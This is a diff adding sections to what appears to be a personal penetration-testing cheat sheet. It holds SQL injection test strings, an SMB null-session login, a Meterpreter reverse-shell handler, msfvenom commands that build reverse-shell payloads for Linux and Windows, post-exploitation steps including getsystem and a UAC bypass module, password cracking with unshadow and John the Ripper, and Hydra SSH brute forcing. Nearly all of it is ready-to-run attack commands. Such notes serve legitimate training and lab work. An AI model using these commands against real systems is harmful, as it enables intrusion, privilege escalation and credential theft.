@@ -116,6 +116,12 @@ Exploit vulnerable user input by looking at:
 - Request headers
 - POST/GET parameters
 
+##### SQLi Test
+```
+1=1; -- -
+'a'='a'; -- -
+```
+
 ##### SQLMap
 ```
 # sqlmap -u <URL> -p <parameter>
@@ -123,11 +129,70 @@ Exploit vulnerable user input by looking at:
 # sqlmap -u <URL> -D <DATABASE NAME> -T <TABLE NAME> --dump
 ```
 
-##### SMB Null Attack
+### SMB Null Attack
 Attempt to access the share without credentials:
 ```
 $ smbclient //<IP ADDR>/share -N
 ```
+
+### Meterpreter Reverse Shell - Handler
+```
+msfconsole> use exploit/multi/handler
+msfconsole> set payload linux/x64/meterpreter_reverse_tcp
+msfconsole> show options
+msfconsole> set LHOST <LOCAL IP>
+msfconsole> set LPORT <PORT>
+msfconsole> run
+```
+
+### Meterpreter Reverse Shell - Payload
+#### Binaries
+##### Linux
+```
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<LOCAL IP> lport=<PORT> -f elf -o shell.elf
+```
+##### Windows
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<LOCAL IP> lport=<PORT> -f exe -o shell.exe
+```
+
+### Meterpreter Commands
+```
+meterpreter> ps
+meterpreter> getuid
+meterpreter> getpid
+meterpreter> getsystem
+meterpreter> ps -U SYSTEM
+```
+#### Check UAC / Privileges
+```
+meterpreter> run post/windows/gather/win_privs
+```
+#### Bypass UAC / 
+```
+meterpreter> background
+msfconsole> use exploit/windows/local/bypassuac
+msfconsole> set session -i <SESSION ID>
+```
+
+## Cracking and Bruteforcing
+### Unshadow
+```
+$ unshadow passwd shadow > unshadowed.txt
+```
+
+### John The Ripper
+```
+$ john --wordlist=/usr/share/wordlists/rockyou.txt <HASH FILE>
+```
+
+### Hydra
+#### SSH Bruteforcing
+```
+hydra -L users.txt -P passwords.txt ssh://<IP ADDR>:<PORT>
+```
+[Wordlist for users](https://github.com/nmap/ncrack/blob/master/lists/minimal.usr)  
+[Wordlist for passwords - (small)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-15.txt)
 
 ## Other
 
@@ -140,4 +205,16 @@ $ enum4linux -a <IP ADDR>
 ### MySQL 
 ```
 $ 
+```
+
+### Download files via SSH
+```
+$ scp <USERNAME>@<IP ADDR>:<FILE>
+```
+
+### Windows Misc
+#### Search for files in CMD from current dir
+```
+> dir /b/s "<FILENAME>"
+> dir /b/s "*.txt"
 ```
